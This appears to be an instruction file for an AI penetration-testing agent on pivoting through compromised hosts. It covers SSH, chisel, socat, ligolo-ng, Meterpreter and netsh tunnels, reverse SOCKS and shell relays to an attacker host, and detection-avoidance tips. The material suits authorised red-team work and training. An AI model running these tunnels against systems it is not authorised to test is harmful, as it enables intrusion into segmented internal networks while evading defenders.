---
name: Pivoting & Tunneling
description: Network pivoting, port forwarding, proxychains, SSH tunneling, and multi-hop access techniques
---

# Pivoting & Tunneling

Pull this skill when you've gained initial access to a host and need to reach internal networks, route traffic through a compromised host, or bypass network segmentation.

## Tool wiring

| Action | Tool | Notes |
|--------|------|-------|
| Interactive shell on pivot | `kali_shell` | Primary interface for all tunneling tools |
| Port forwarding (single) | `kali_shell` — `socat`, `ssh -L`, `chisel client` | |
| SOCKS proxy | `kali_shell` — `chisel server --socks5`, `ssh -D` | |
| Proxychains routing | `kali_shell` — `proxychains4 <tool>` | Config at `/etc/proxychains4.conf` |
| Port forwarding (multi) | `kali_shell` — `chisel`, `ssh -R`, `socat` | |
| Meterpreter routing | `kali_shell` — `msfconsole` | `route add` via existing session |
| Ligolo-ng | `kali_shell` — `ligolo-ng` | Agent/proxy split, creates tun interface |
| goproxy | `kali_shell` — `goproxy` | HTTP/SOCKS5 proxy chaining |

> **Availability**: socat, proxychains4, ssh, and curl are pre-installed. Chisel and ligolo-ng may need `apt install` if `KALI_INSTALL_ENABLED=true`.

## Primer

Pivoting lets you turn a compromised host into a staging point to reach segmented internal networks that the attacker machine cannot access directly. There are three fundamental patterns:

1. **Forward (local) — you reach services through the pivot**: `ssh -L`, `chisel client`, `socat`
2. **Reverse (remote) — pivot reaches services on your machine**: `ssh -R`, `chisel reverse`
3. **SOCKS proxy — dynamic routing through the pivot**: `ssh -D`, `chisel socks5`, `proxychains`

## Two-pass model

1. **Enumerate pivot's network**: `ip addr`, `ip route`, `cat /etc/hosts`, `arp -a`, `ss -tlnp` to find internal subnets and connected hosts.
2. **Deploy tunnel**: Choose the right tunneling method based on reachability and tools available on the pivot.

## Pivot method decision matrix

| Scenario | Method | Command |
|----------|--------|---------|
| SSH outbound from pivot to you | Reverse SSH tunnel | `ssh -R 0.0.0.0:8080:internal:80 user@your-host` |
| SSH from you to pivot | Local SSH tunnel | `ssh -L 8080:internal:80 user@pivot` |
| No SSH, pivot can reach your host | Chisel reverse | Pivot: `chisel client your-host:443 R:socks` |
| No SSH, pivot can't reach you | Chisel forward | You: `chisel server -p 443 --socks5`; Pivot: `chisel client your-host:443 R:socks` |
| Quick single-port relay | socat | `socat TCP-LISTEN:8080,fork TCP:target:80` |
| Full layer-2 tunnel | Ligolo-ng | Agent on pivot, proxy on your machine |
| Windows pivot without SSH | Netsh port forwarding | `netsh interface portproxy add v4tov4 ...` |

## SSH tunneling

### Local port forwarding
```bash
# You can reach pivot via SSH, pivot can reach internal:80
ssh -L 8080:internal-host:80 user@pivot-ip
# Now http://localhost:8080 reaches internal-host:80
```

### Remote port forwarding
```bash
# Pivot can reach you via SSH, you want pivot's internal access
ssh -R 0.0.0.0:8080:internal-host:80 user@your-host
# Now http://your-host:8080 reaches internal-host:80 via pivot
```

### Dynamic SOCKS proxy
```bash
ssh -D 9050 user@pivot-ip
# Then route tools through proxychains
proxychains4 nmap -sT -Pn -p 80,443,445 internal-host
proxychains4 curl http://internal-host/admin
```

### Multi-hop (SSH jump)
```bash
ssh -J user@jump-box user@target-host -L 8080:target-host:80
```

## Chisel tunneling

### Chisel reverse SOCKS (pivot can initiate outbound)
```bash
# On your host (attacker) — start chisel server:
chisel server -p 443 --reverse --socks5

# On pivot:
chisel client your-public-host:443 R:socks

# Add to proxychains.conf:
# socks5 127.0.0.1 1080
```

### Chisel forward SOCKS (pivot cannot initiate outbound)
```bash
# On your host:
chisel server -p 443 --socks5

# On pivot (if it can reach you):
chisel client your-public-host:443 socks
```

### Chisel port forwarding
```bash
# Forward a single port through chisel:
# On your host:
chisel server -p 443 --reverse

# On pivot:
chisel client your-host:443 R:8080:internal-host:80
```

## socat relays

### Simple port forward
```bash
# On pivot — forward connections from port 8080 to internal:80
socat TCP-LISTEN:8080,fork TCP:internal-host:80
```

### Bidirectional relay for shell
```bash
# On pivot:
socat TCP-LISTEN:4444,fork TCP:your-host:4444

# Attacker connects to pivot:4444 -> traffic flows to your-host:4444
```

## Ligolo-ng (layer-2 tunnel)

```bash
# On your machine (proxy):
sudo ip tuntap add dev ligolo mode tun
sudo ip link set ligolo up
sudo ip route add 10.0.0.0/8 dev ligolo  # route internal subnet through tunnel
ligolo-proxy -selfcert

# On pivot (agent):
ligolo-agent -connect your-host:11601 -ignore-cert

# In proxy session:
# session
# 1
# start
```

## Meterpreter routing

```bash
# From within msfconsole with an active session:
meterpreter > run autoroute -s 10.0.0.0/8
meterpreter > bg
msf6 > route add 10.0.0.0 255.0.0.0 1
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 10.0.1.10
msf6 > run
```

## Port forwarding on Windows (no SSH)

```cmd
# On Windows pivot (admin required):
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.0.0.10

# Verify:
netsh interface portproxy show all

# Remove:
netsh interface portproxy del v4tov4 listenport=8080
```

## Detection avoidance

| Technique | OPSEC note |
|-----------|------------|
| SSH over port 443 | Bypasses egress filters; blends with HTTPS |
| Chisel over WebSocket | Traffic looks like WebSocket upgrade; hard to fingerprint |
| SOCKS5 via proxychains | DNS leaks possible — set `proxy_dns` in config |
| Ligolo-ng | Uses QUIC (UDP); may be blocked by strict egress |
| socat | No encryption — use only on trusted networks or pair with SSH |

## Validation shape

A clean pivot finding should include:
- **Entry point**: How initial access was gained (CVE, creds, etc.)
- **Pivot host**: OS, IP, network interfaces, connected subnets
- **Method**: Which tunneling technique was used (SSH, chisel, etc.)
- **Access gained**: List of internal hosts/ports reached
- **Data flow**: Diagram or description of the traffic path

## Common pitfalls

| Pitfall | Fix |
|---------|-----|
| `ssh: connect to host: port 22: Connection refused` | SSH server not running on pivot; use chisel/socat instead |
| Proxychains timing out | Increase `tcp_read_time_out` and `tcp_connect_time_out` in `/etc/proxychains4.conf` |
| Chisel certificate errors | Use `--reverse` on server, no cert flags on client |
| Ligolo interface not routing | Verify `ip route` includes the target subnet via the tun interface |
| SOCKS DNS leaks | Set `proxy_dns` in proxychains config or use `socks5 127.0.0.1 9050` |
| Double-hop routing | Chain proxies: proxychains -> ssh -D on second pivot |

## False positives

- **Internal host reachable but all ports filtered**: May be a network ACL or host firewall. Try different source ports or protocols.
- **Pivot can ping but not TCP-connect**: ICMP may be allowed while TCP egress is restricted. Use HTTP/DNS tunnels.
- **chisel connects but no data flows**: Check firewall on the chisel server port. Try port 443 or 80.

## Hand-off

- After establishing a tunnel: `-> /skill network/internal_recon` to enumerate the newly reachable segment
- After finding internal services: `-> /skill network/smb_attacks` or `-> /skill active_directory/ad_kill_chain`
- For SSH key discovery on pivot: `-> /skill post_exploitation/linux_privesc`

## Pro tips

- **Always check multiple interfaces**: `ip addr`, `ifconfig`, `cat /etc/network/interfaces` — many pivots have interfaces not shown by default.
- **Prefer reverse tunnels**: They don't require the pivot to have an open port, bypassing most host firewalls.
- **Layer your proxies**: For deep internal networks, chain chisel on the perimeter pivot, then SSH from there deeper in.
- **Proxychains limitations**: Only TCP works; no UDP, no ICMP. Use `--unstable` for some UDP-like flows.
- **Speed**: socat is fastest, SSH adds encryption overhead, chisel adds WebSocket framing. Choose the simplest that works.
